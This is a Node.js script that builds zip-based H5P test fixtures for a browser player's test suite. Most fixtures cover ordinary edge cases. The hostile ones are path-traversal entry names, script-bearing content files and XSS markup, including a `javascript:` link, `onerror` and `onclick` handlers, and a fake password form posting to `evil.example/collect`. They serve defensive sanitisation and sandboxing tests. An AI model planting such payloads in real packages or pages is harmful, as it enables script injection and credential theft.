import { cp, mkdir, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises'
import { resolve } from 'node:path'
import { BlobWriter, TextReader, Uint8ArrayReader, Uint8ArrayWriter, ZipReader, ZipWriter } from '@zip.js/zip.js'
import { splitPack } from '../../libraries/scripts/parts.mjs'
import { GENERATED_FIXTURES, LARGE_ENTRY_SIZE } from './lib/fixture-names.mjs'

/**
 * Builds the `.h5p` archives the browser tests play. Generated, as two need entries no zip tool
 * writes (a path traversal, media for the slice and chunk paths) and 20 MB does not belong in git.
 */

const rootDir = resolve(import.meta.dirname, '..')
const sourceDir = resolve(rootDir, 'tests', 'fixtures', 'src', 'basic')
const extraLibDir = resolve(rootDir, 'tests', 'fixtures', 'src', 'extra')
const outDir = resolve(rootDir, 'public', 'fixtures')

async function collectFiles(dir, prefix = '') {
  const found = []
  for (const name of await readdir(dir)) {
    const path = resolve(dir, name)
    const entryName = prefix ? `${prefix}/${name}` : name
    if ((await stat(path)).isDirectory()) {
      found.push(...(await collectFiles(path, entryName)))
    } else {
      found.push({ entryName, path })
    }
  }
  return found
}

async function writeArchive(name, build) {
  const writer = new ZipWriter(new BlobWriter('application/zip'))
  await build(writer)
  const blob = await writer.close()
  const bytes = new Uint8Array(await blob.arrayBuffer())
  await writeFile(resolve(outDir, name), bytes)
  return bytes.length
}

const baseFiles = await collectFiles(sourceDir)

const addBaseFiles = async (writer, { skip = [] } = {}) => {
  for (const { entryName, path } of baseFiles) {
    if (skip.includes(entryName)) continue
    const contents = await readFile(path)
    await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(contents)))
  }
}

/** Highly compressible filler: 20 MB that deflates to a few kilobytes, so the archive stays small. */
const compressibleBytes = () => new Uint8Array(LARGE_ENTRY_SIZE)

/** Incompressible filler: stored either way, and the stored path is what it is here to exercise. */
const randomBytes = (size = LARGE_ENTRY_SIZE) => {
  const bytes = new Uint8Array(size)
  // `crypto.getRandomValues` caps at 64 kB per call.
  for (let offset = 0; offset < bytes.length; offset += 65536) {
    crypto.getRandomValues(bytes.subarray(offset, Math.min(offset + 65536, bytes.length)))
  }
  return bytes
}

// Only the archives this script owns are cleared: a real `.h5p` dropped into `public/fixtures/` to
// try against the demo would otherwise be deleted on the next `pnpm dev`.

await mkdir(outDir, { recursive: true })
for (const name of GENERATED_FIXTURES) {
  await rm(resolve(outDir, name), { force: true })
}

const built = []

// 1. The ordinary case: every entry small and deflated.
built.push([
  'basic.h5p',
  await writeArchive('basic.h5p', async (writer) => {
    await addBaseFiles(writer)
  })
])

// 1a. As h5p-author writes a package (#146): unread editor libraries after the content, two scripts
//     of 100 kB that do not compress, so the run lies between the index's first and last block.
built.push([
  'installable.h5p',
  await writeArchive('installable.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['H5P.OfflineTest-1.0/library.json'] })
    const library = JSON.parse(await readFile(resolve(sourceDir, 'H5P.OfflineTest-1.0', 'library.json'), 'utf8'))
    await writer.add(
      'H5P.OfflineTest-1.0/library.json',
      new TextReader(JSON.stringify({ ...library, editorDependencies: [{ machineName: 'H5PEditor.OfflineTest', majorVersion: 1, minorVersion: 0 }] }))
    )
    const editor = (machineName, needs) => ({
      title: machineName,
      machineName,
      majorVersion: 1,
      minorVersion: 0,
      patchVersion: 0,
      runnable: 0,
      license: 'MIT',
      preloadedJs: [{ path: 'editor.js' }],
      ...(needs ? { preloadedDependencies: [{ machineName: needs, majorVersion: 1, minorVersion: 0 }] } : {})
    })
    for (const [machineName, needs] of [['H5PEditor.OfflineTest', 'H5PEditor.OfflineTestWidget'], ['H5PEditor.OfflineTestWidget', null]]) {
      await writer.add(`${machineName}-1.0/library.json`, new TextReader(JSON.stringify(editor(machineName, needs))))
      await writer.add(`${machineName}-1.0/editor.js`, new Uint8ArrayReader(randomBytes(100 * 1024)))
    }
  })
])

// 1b. A result and its parts: `answered` from Answer, a child's `completed` with its parent, and a
//     parentless one, as Interactive Book runs chapters. Only the content's own statements count.
built.push([
  'finished.h5p',
  await writeArchive('finished.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({
          message: 'A result, and a part inside it.',
          answer: true,
          child: { library: 'H5P.OfflineTest 1.0', subContentId: '9d3c1f0a-2b4e-4c6d-8e1f-3a5b7c9d1e2f', params: { message: 'A part.' } },
          looseChild: { library: 'H5P.OfflineTest 1.0', subContentId: '4b8e2d6f-1a3c-4e5f-9b7d-2c4e6a8f0b1d', params: { message: 'A part without a parent.' } }
        })
      )
    )
  })
])

// 1c. Names its language in `h5p.json`, so H5P's own strings follow it whatever the page's (#55);
//     `basic.h5p` names none and plays in the element's.
for (const [name, language] of [
  ['german.h5p', 'de'],
  ['english.h5p', 'en']
]) {
  built.push([
    name,
    await writeArchive(name, async (writer) => {
      const manifest = JSON.parse(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8'))
      await writer.add('h5p.json', new TextReader(JSON.stringify({ ...manifest, language, defaultLanguage: language })))
      await addBaseFiles(writer, { skip: ['h5p.json'] })
    })
  ])
}

// 1d. German, `h5p.json` behind a megabyte of media as in `boardgame.h5p`: without Range the worker
//     opens its reader before the manifest arrives, and the frame must still boot in German (#57).
built.push([
  'german-late-manifest.h5p',
  await writeArchive('german-late-manifest.h5p', async (writer) => {
    const manifest = JSON.parse(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8'))
    await addBaseFiles(writer, { skip: ['h5p.json'] })
    await writer.add('content/media/before.bin', new Uint8ArrayReader(randomBytes(1024 * 1024)), { level: 0 })
    await writer.add('h5p.json', new TextReader(JSON.stringify({ ...manifest, language: 'de', defaultLanguage: 'de' })))
    await writer.add('content/media/after.bin', new Uint8ArrayReader(randomBytes(4 * 1024 * 1024)), { level: 0 })
  })
])

// 1e. Empty files, as real exports carry them: an empty script beside the content type's own, and
//     empty files in `content/`, one deflated as most writers leave it and one stored.
built.push([
  'empty-files.h5p',
  await writeArchive('empty-files.h5p', async (writer) => {
    const library = JSON.parse(await readFile(resolve(sourceDir, 'H5P.OfflineTest-1.0', 'library.json'), 'utf8'))
    await writer.add('H5P.OfflineTest-1.0/library.json', new TextReader(JSON.stringify({ ...library, preloadedJs: [...library.preloadedJs, { path: 'empty.js' }] })))
    await addBaseFiles(writer, { skip: ['H5P.OfflineTest-1.0/library.json'] })
    await writer.add('H5P.OfflineTest-1.0/empty.js', new Uint8ArrayReader(new Uint8Array(0)))
    await writer.add('content/empty.txt', new Uint8ArrayReader(new Uint8Array(0)))
    await writer.add('content/empty-stored.txt', new Uint8ArrayReader(new Uint8Array(0)), { level: 0 })
  })
])

// 2. A large deflated entry: the Jobs worker inflates it into chunks and the virtual server
//    serves the prefix that exists as a shorter 206.
built.push([
  'large-deflated.h5p',
  await writeArchive('large-deflated.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({ message: 'Large deflated media', media: { path: 'media/big.bin' } })
      )
    )
    await writer.add('content/media/big.bin', new Uint8ArrayReader(compressibleBytes()))
    // Large, deflated, and referenced by nothing: the prefetch case. The runtime never asks for
    // it, so an extraction of it can only have been started ahead of demand.
    await writer.add('content/media/unused.bin', new Uint8ArrayReader(compressibleBytes()))
  })
])

// 3. A large stored entry: sliced straight out of the archive, never extracted or stored.
built.push([
  'large-stored.h5p',
  await writeArchive('large-stored.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({ message: 'Large stored media', media: { path: 'media/big.bin' } })
      )
    )
    await writer.add('content/media/big.bin', new Uint8ArrayReader(randomBytes()), { level: 0 })
  })
])

// 3b. A large deflated entry that does not compress, so its span is fetched in segments over HTTP
//     (20 MB of zeros deflate to 20 kB): this exercises `segmentedStream` end to end.
built.push([
  'segmented.h5p',
  await writeArchive('segmented.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({ message: 'Large incompressible deflated media', media: { path: 'media/big.bin' } })
      )
    )
    await writer.add('content/media/big.bin', new Uint8ArrayReader(randomBytes()))
  })
])

// 3c. Every entry with a data descriptor, as h5p.com's exporter writes it: sizes after the data.
//     Libraries first and media last, so a host that ignores Range boots before the media lands.
built.push([
  'streamed.h5p',
  await writeArchive('streamed.h5p', async (writer) => {
    const streamed = (bytes) => new Blob([bytes]).stream()
    const ordered = [...baseFiles]
      .filter(({ entryName }) => entryName !== 'content/content.json')
      .sort((a, b) => Number(a.entryName.startsWith('content/')) - Number(b.entryName.startsWith('content/')))
    for (const { entryName, path } of ordered) {
      await writer.add(entryName, streamed(new Uint8Array(await readFile(path))), { dataDescriptor: true })
    }
    await writer.add(
      'content/content.json',
      streamed(new TextEncoder().encode(JSON.stringify({ message: 'Streamed archive', media: { path: 'media/big.bin' } }))),
      { dataDescriptor: true }
    )
    await writer.add('content/media/big.bin', streamed(compressibleBytes()), { dataDescriptor: true })
  })
])

// 4. Hostile names. A zip tool will not write these, which is exactly why they are here.
built.push([
  'traversal.h5p',
  await writeArchive('traversal.h5p', async (writer) => {
    await addBaseFiles(writer)
    await writer.add('../escaped.js', new TextReader('window.escaped = true'))
    await writer.add('content\\windows.json', new TextReader('{"windows":true}'))
    await writer.add('nested/../../escaped-too.js', new TextReader('window.escapedToo = true'))
  })
])

// 5. Content with no libraries — what h5p.com and h5p.org hand you when the site they came from
//    already has them. The runtime asks for `<MainLibrary>/library.json` and gets nothing.
built.push([
  'content-only.h5p',
  await writeArchive('content-only.h5p', async (writer) => {
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Content without its libraries',
          language: 'en',
          mainLibrary: 'H5P.InteractiveVideo',
          embedTypes: ['iframe'],
          license: 'U',
          // Versions as strings, the way an h5p.org export writes them.
          preloadedDependencies: [
            { machineName: 'H5P.InteractiveVideo', majorVersion: '1', minorVersion: '27' }
          ]
        })
      )
    )
    await writer.add('content/content.json', new TextReader(JSON.stringify({ interactiveVideo: {} })))
  })
])

// 6. The same shape, but for a content type we can supply locally: an export stripped of its
//    libraries, plus a bundle that carries them. Together they have to play.
const OFFLINE_TEST_DEPENDENCY = {
  machineName: 'H5P.OfflineTest',
  majorVersion: '1',
  minorVersion: '0'
}

built.push([
  'needs-libraries.h5p',
  await writeArchive('needs-libraries.h5p', async (writer) => {
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Stripped export',
          language: 'en',
          mainLibrary: 'H5P.OfflineTest',
          embedTypes: ['div'],
          license: 'U',
          // Only the main library, the way a content-only export writes it.
          preloadedDependencies: [OFFLINE_TEST_DEPENDENCY]
        })
      )
    )
    await writer.add(
      'content/content.json',
      new TextReader(JSON.stringify({ message: 'Libraries came from somewhere else.' }))
    )
  })
])

const extraLibFiles = await collectFiles(extraLibDir)

built.push([
  'libraries.h5p',
  await writeArchive('libraries.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      // Libraries only: no h5p.json of the content's, no content folder.
      if (!entryName.startsWith('H5P.OfflineTest-1.0/')) continue
      await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    for (const { entryName, path } of extraLibFiles) {
      await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Library bundle',
          language: 'und',
          mainLibrary: 'H5P.OfflineTest',
          embedTypes: ['div'],
          license: 'U',
          // H5P.OfflineExtra appears only here. The merged manifest is what makes it load.
          preloadedDependencies: [
            OFFLINE_TEST_DEPENDENCY,
            { machineName: 'H5P.OfflineExtra', majorVersion: '1', minorVersion: '0' }
          ]
        })
      )
    )
  })
])

// 6. A content type needing a library h5p.json does not name (the bundle has it): the runtime would
//    end its boot on the 404. Media last, so a host without `Range` boots the frame early.
const NEEDS_DEPENDENCY_LIBRARY = 'H5P.OfflineTest-1.0/library.json'
const libraryNeedingExtra = JSON.parse(await readFile(resolve(sourceDir, NEEDS_DEPENDENCY_LIBRARY), 'utf8'))
libraryNeedingExtra.preloadedDependencies = [{ machineName: 'H5P.OfflineExtra', majorVersion: 1, minorVersion: 0 }]
built.push([
  'needs-dependency.h5p',
  await writeArchive('needs-dependency.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      const contents =
        entryName === NEEDS_DEPENDENCY_LIBRARY
          ? new TextEncoder().encode(JSON.stringify(libraryNeedingExtra))
          : new Uint8Array(await readFile(path))
      await writer.add(entryName, new Uint8ArrayReader(contents))
    }
    await writer.add('content/media/tail.bin', new Uint8ArrayReader(randomBytes(256 * 1024)), { level: 0 })
  })
])

// 6a. To play `untrusted`: its own copy of the content type marks the page if it runs (the bundle's
//     must play instead), and a file of each kind under `content/`, only some of them servable.
const PIXEL_PNG = Uint8Array.from(
  atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII='),
  (character) => character.charCodeAt(0)
)
const OWN_LIBRARY_SCRIPT = `var H5P = H5P || {};
window.ownLibraryRan = true;
H5P.OfflineTest = function () {
  this.attach = function ($container) {
    $container.html('<p class="h5p-offline-test-message">The package\\'s own code ran.</p>');
  };
};
`
const UNTRUSTED_CONTENT = {
  'content/content.json': JSON.stringify({ message: 'Content from an untrusted package.' }),
  'content/data.json': JSON.stringify({ shown: true }),
  'content/notes.txt': 'window.contentFileRan = true',
  'content/script.js': 'window.contentFileRan = true',
  'content/page.html': '<!doctype html><script>parent.contentFileRan = true</script>',
  'content/drawing.svg': '<svg xmlns="http://www.w3.org/2000/svg"><script>window.contentFileRan = true</script></svg>',
  'content/data.xml': '<data/>',
  'loose.js': 'window.contentFileRan = true'
}

built.push([
  'untrusted.h5p',
  await writeArchive('untrusted.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      if (entryName === 'content/content.json') continue
      const contents = entryName.endsWith('/offline-test.js') ? new TextEncoder().encode(OWN_LIBRARY_SCRIPT) : new Uint8Array(await readFile(path))
      await writer.add(entryName, new Uint8ArrayReader(contents))
    }
    for (const [entryName, text] of Object.entries(UNTRUSTED_CONTENT)) await writer.add(entryName, new TextReader(text))
    await writer.add('content/images/pixel.png', new Uint8ArrayReader(PIXEL_PNG))
  })
])

// 6a'. One that needs a version of the content type only it carries: refused `untrusted`, with
//      the error saying its own copy would have played it.
built.push([
  'untrusted-newer.h5p',
  await writeArchive('untrusted-newer.h5p', async (writer) => {
    const manifest = JSON.parse(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8'))
    manifest.preloadedDependencies = [{ machineName: 'H5P.OfflineTest', majorVersion: 1, minorVersion: 3 }]
    await writer.add('h5p.json', new TextReader(JSON.stringify(manifest)))
    for (const { entryName, path } of baseFiles) {
      if (entryName === 'h5p.json') continue
      const renamed = entryName.replace(/^H5P\.OfflineTest-1\.0\//, 'H5P.OfflineTest-1.3/')
      let contents = new Uint8Array(await readFile(path))
      if (renamed === 'H5P.OfflineTest-1.3/library.json') {
        contents = new TextEncoder().encode(JSON.stringify({ ...JSON.parse(new TextDecoder().decode(contents)), minorVersion: 3 }))
      }
      await writer.add(renamed, new Uint8ArrayReader(contents))
    }
  })
])

// 6a'''. `h5p.json` names a newer minor than the folder it carries, as a disagreeing export does:
//        nothing has 1.1, so its own 1.0 plays, or it is refused with `downgrade-libraries="off"`.
built.push([
  'older-own.h5p',
  await writeArchive('older-own.h5p', async (writer) => {
    const manifest = JSON.parse(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8'))
    manifest.preloadedDependencies = [{ machineName: 'H5P.OfflineTest', majorVersion: 1, minorVersion: 1 }]
    await writer.add('h5p.json', new TextReader(JSON.stringify(manifest)))
    await addBaseFiles(writer, { skip: ['h5p.json'] })
  })
])

// 6a''. Content to check against the semantics: markup a field does not allow, a scheme off the
//       list, a stray field, in sub-content too. Trusted, all reaches the page; untrusted, none.
const MARKUP_CONTENT = {
  message: 'Checked against its semantics.',
  html:
    '<p class="kept">Kept <strong>bold</strong> and <a href="javascript:window.contentScriptRan = true" onclick="window.contentScriptRan = true">a link</a></p>' +
    '<script>window.contentScriptRan = true</script><img src="x" onerror="window.contentScriptRan = true">' +
    '<form action="https://evil.example/collect"><input name="password" placeholder="Your password"></form>',
  stray: '<script>window.contentScriptRan = true</script>',
  child: {
    library: 'H5P.OfflineTest 1.0',
    subContentId: '4f1b0c2e-8a7d-4e3b-9c1a-0d2e3f4a5b6c',
    params: { message: 'A child.', html: '<em>Child</em><script>window.childScriptRan = true</script>' }
  }
}

built.push([
  'untrusted-markup.h5p',
  await writeArchive('untrusted-markup.h5p', async (writer) => {
    await writer.add('h5p.json', new TextReader(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8')))
    await writer.add('content/content.json', new TextReader(JSON.stringify(MARKUP_CONTENT)))
  })
])

// 6a'''. The bundle without the content type's semantics: nothing to check the content against,
//        so an untrusted package does not play.
built.push([
  'libraries-without-semantics.h5p',
  await writeArchive('libraries-without-semantics.h5p', async (writer) => {
    const bundle = new ZipReader(new Uint8ArrayReader(new Uint8Array(await readFile(resolve(outDir, 'libraries.h5p')))))
    for (const entry of await bundle.getEntries()) {
      if (entry.directory || entry.filename.endsWith('/semantics.json')) continue
      await writer.add(entry.filename, new Uint8ArrayReader(await entry.getData(new Uint8ArrayWriter())))
    }
    await bundle.close()
  })
])

// 6b. Content for older minors than the bundle serves (1.2 and 1.1, each with `upgrades.js`): the
//     frame must run the steps in between before the runtime reads the parameters.
const upgradeLibFiles = await collectFiles(resolve(rootDir, 'tests', 'fixtures', 'src', 'upgrade'))
const offlineTestLibrary = JSON.parse(await readFile(resolve(sourceDir, 'H5P.OfflineTest-1.0', 'library.json'), 'utf8'))

built.push([
  'upgrade-libraries.h5p',
  await writeArchive('upgrade-libraries.h5p', async (writer) => {
    // The content type's own scripts and styles, as 1.2; its upgrade steps come from the source folder.
    for (const { entryName, path } of baseFiles) {
      if (!entryName.startsWith('H5P.OfflineTest-1.0/') || entryName.endsWith('/library.json')) continue
      const name = entryName.replace('H5P.OfflineTest-1.0/', 'H5P.OfflineTest-1.2/')
      await writer.add(name, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    await writer.add('H5P.OfflineTest-1.2/library.json', new TextReader(JSON.stringify({ ...offlineTestLibrary, minorVersion: 2 })))
    for (const { entryName, path } of upgradeLibFiles) {
      await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Library bundle with newer minors',
          language: 'und',
          mainLibrary: 'H5P.OfflineTest',
          embedTypes: ['div'],
          license: 'U',
          preloadedDependencies: [{ machineName: 'H5P.OfflineTest', majorVersion: 1, minorVersion: 2 }]
        })
      )
    )
  })
])

const offlineChild = (version, text) => ({ library: `H5P.OfflineChild ${version}`, params: { text }, subContentId: 'offline-child' })
for (const [name, minor, content] of [
  // Every step of both libraries.
  ['upgrade-1.0.h5p', '0', { message: 'Written for 1.0', child: offlineChild('1.0', 'Child written for 1.0') }],
  // Only the step to 1.2.
  ['upgrade-1.1.h5p', '1', { message: 'Written for 1.1' }],
  // The versions the bundle serves: nothing to run.
  ['upgrade-1.2.h5p', '2', { message: 'Written for 1.2', child: offlineChild('1.1', 'Child written for 1.1') }],
  // The first step throws: played as written.
  ['upgrade-fails.h5p', '0', { message: 'Written for 1.0', failUpgrade: true, child: offlineChild('1.0', 'Child written for 1.0') }],
  // A minor ahead of everything the bundle and the pack serve, the sub-content too: played at their
  // newest older minor, with no step run, or refused with `downgrade-libraries="off"` (#85).
  ['upgrade-1.3.h5p', '3', { message: 'Written for 1.3', child: offlineChild('1.2', 'Child written for 1.2') }],
  // The content type at the version served, its sub-content a minor ahead: named only in the
  // parameters, as a stripped export from h5p.com names a question type newer than the pack's.
  ['newer-child.h5p', '2', { message: 'Written for 1.2', child: offlineChild('1.2', 'Child written for 1.2') }]
]) {
  built.push([
    name,
    await writeArchive(name, async (writer) => {
      await writer.add(
        'h5p.json',
        new TextReader(
          JSON.stringify({
            title: `Written for H5P.OfflineTest 1.${minor}`,
            language: 'en',
            mainLibrary: 'H5P.OfflineTest',
            embedTypes: ['div'],
            license: 'U',
            // A stripped export's list: the main library alone, its versions as strings.
            preloadedDependencies: [{ machineName: 'H5P.OfflineTest', majorVersion: '1', minorVersion: minor }]
          })
        )
      )
      await writer.add('content/content.json', new TextReader(JSON.stringify(content)))
    })
  ])
}

// 7. Library folders with no version suffix, the way older packages are built. Each library is
//    looked for under the versioned name first and under the bare one after the 404.
built.push([
  'unversioned.h5p',
  await writeArchive('unversioned.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      const bare = entryName.replace(/^H5P\.OfflineTest-1\.0\//, 'H5P.OfflineTest/')
      await writer.add(bare, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
  })
])

// 7a. The same plus the extra library: with the pack, the content type plays from a versioned
//     folder and the extra one from a bare one; one naming rule for both ended boot on a 404 (#37).
const UNVERSIONED_MANIFEST = { ...JSON.parse(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8')) }
UNVERSIONED_MANIFEST.preloadedDependencies = [
  ...UNVERSIONED_MANIFEST.preloadedDependencies,
  { machineName: 'H5P.OfflineExtra', majorVersion: 1, minorVersion: 0 }
]
built.push([
  'unversioned-pack.h5p',
  await writeArchive('unversioned-pack.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      if (entryName === 'h5p.json') {
        await writer.add('h5p.json', new TextReader(JSON.stringify(UNVERSIONED_MANIFEST)))
        continue
      }
      const bare = entryName.replace(/^H5P\.OfflineTest-1\.0\//, 'H5P.OfflineTest/')
      await writer.add(bare, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    for (const { entryName, path } of extraLibFiles) {
      await writer.add(entryName.replace(/^H5P\.OfflineExtra-1\.0\//, 'H5P.OfflineExtra/'), new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
  })
])

// 8. A zip that is not an H5P package at all.
built.push([
  'not-h5p.h5p',
  await writeArchive('not-h5p.h5p', async (writer) => {
    await writer.add('readme.txt', new TextReader('This archive has no h5p.json.'))
  })
])

// 9. Not a zip at all: the index read has to fail cleanly rather than hang.
const garbage = new TextEncoder().encode('this is not a zip archive, not even close\n')
await writeFile(resolve(outDir, 'corrupt.h5p'), garbage)
built.push(['corrupt.h5p', garbage.length])

// 10. An HTML page where the archive should be: a login wall or error page a host serves with
// status 200. Written here, so it does not depend on the dev server's SPA fallback.
const page = new TextEncoder().encode('<!doctype html>\n<html><head><title>Sign in</title></head><body><form>…</form></body></html>\n')
await writeFile(resolve(outDir, 'html-page.h5p'), page)
built.push(['html-page.h5p', page.length])

// 11. A pack split as the real one is (`splitPack`): content type 1.2 with upgrades, sub-content
//     1.1, the extra library; `pack-tampered/` has a wrong hash. Directories, so not listed below.
const packWriter = new ZipWriter(new BlobWriter('application/zip'))
for (const { entryName, path } of baseFiles) {
  if (!entryName.startsWith('H5P.OfflineTest-1.0/') || entryName.endsWith('/library.json')) continue
  await packWriter.add(entryName.replace('H5P.OfflineTest-1.0/', 'H5P.OfflineTest-1.2/'), new Uint8ArrayReader(new Uint8Array(await readFile(path))))
}
await packWriter.add('H5P.OfflineTest-1.2/library.json', new TextReader(JSON.stringify({ ...offlineTestLibrary, minorVersion: 2 })))
for (const { entryName, path } of [...upgradeLibFiles, ...extraLibFiles]) {
  await packWriter.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
}
const packIndex = await splitPack(new Uint8Array(await (await packWriter.close()).arrayBuffer()), resolve(outDir, 'pack'))
await rm(resolve(outDir, 'pack-tampered'), { recursive: true, force: true })
await cp(resolve(outDir, 'pack'), resolve(outDir, 'pack-tampered'), { recursive: true })
await writeFile(
  resolve(outDir, 'pack-tampered', 'index.json'),
  JSON.stringify({ libraries: packIndex.map((entry) => (entry.machineName === 'H5P.OfflineTest' ? { ...entry, sha256: '0'.repeat(64) } : entry)) })
)

// The list in `fixture-names.mjs` is what the next run clears and the demo build ships: an
// archive written here and not listed there would be neither, silently.
const written = new Set(built.map(([name]) => name))
const listed = new Set(GENERATED_FIXTURES)
const unlisted = [...written].filter((name) => !listed.has(name))
const unbuilt = [...listed].filter((name) => !written.has(name))
if (unlisted.length > 0 || unbuilt.length > 0) {
  throw new Error(`fixture-names.mjs and build-fixtures.mjs disagree: not listed: ${unlisted.join(', ') || 'none'}; not built: ${unbuilt.join(', ') || 'none'}`)
}

for (const [name, size] of built) {
  console.log(`[fixtures] ${name.padEnd(22)} ${(size / 1024).toFixed(1)} kB`)
}
console.log(`[fixtures] ${'pack/'.padEnd(22)} ${packIndex.length} parts, and pack-tampered/`)
